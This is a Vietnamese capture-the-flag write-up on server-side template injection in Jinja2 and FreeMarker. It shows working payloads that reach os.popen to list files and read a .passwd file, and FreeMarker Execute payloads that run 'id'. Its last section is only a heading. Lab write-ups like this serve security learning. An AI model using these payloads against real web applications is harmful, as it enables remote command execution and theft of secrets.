# Trần Mạnh Huy

* [Python - Server-side Template Injection Introduction](#python---server-side-template-injection-introduction)
* [Java - Server-side Template Injection](#java---server-side-template-injection)
* [Python - Blind SSTI Filters Bypass](#python---blind-ssti-filters-bypass)


## Python - Server-side Template Injection Introduction

```
Statement

This service allows you to generate a web page. Use it to read the flag!

```

#### Đễ thấy ứng dụng nhận vào hai tham số trong đó giá trị content gặp phải lỗ hổng SSTI, thử với payload **{{10*10}}** trong phần content được server trả về kết quả: 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root01_01.jpg)

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root01_02.jpg)

Do kết quả trả về là "10101010101010101010" nên có thể xác nhận template được dùng ở đây là jinja2, còn nếu trả về 100 thì sẽ là template twig.

#### Đã xác định được template là jinja2, ta có thể build được payload khai thác từ nó
Dùng TemplateReference object để import các module bằng payload:

```
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('ls').read() }}

```
Ta được:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root01_03.jpg)

#### Thay payload trên bằng {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('ls -lsa').read() }}

Thấy được file .passwd. Sửa payload thành : **{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('cat .passwd').read() }}** ta được pass để giải chall này

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root01_04.jpg)

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root01_06.jpg)


## Java - Server-side Template Injection

```
Statement

Exploit the vulnerability in order to retrieve the validation password in the file SECRET_FLAG.txt.

```

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root02_01.jpg)

Sau khi thử test 1 hồi thì thấy nó bị dính SSTI thông qua payloads:${7*7} 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root02_02.jpg)

Để ý kĩ gì khi thực hiện request GET lên server, phần HEADER của template đang kh chuẩn khi X-Powered-By cho ta biết được website đang dùng tempalte Freemaker hoặc ta có thể thử tiếp khi biết nó bị dính payloads: ${7*7} 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root_02_05.jpg)

Biết được dùng template engine Freemaker rồi thì ta có thể built payload khác thác từ nó như sau:

```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

```
Dùng payload tìm flag: 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root02_03.jpg)

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root02_04.jpg)



## Python - Blind SSTI Filters Bypass
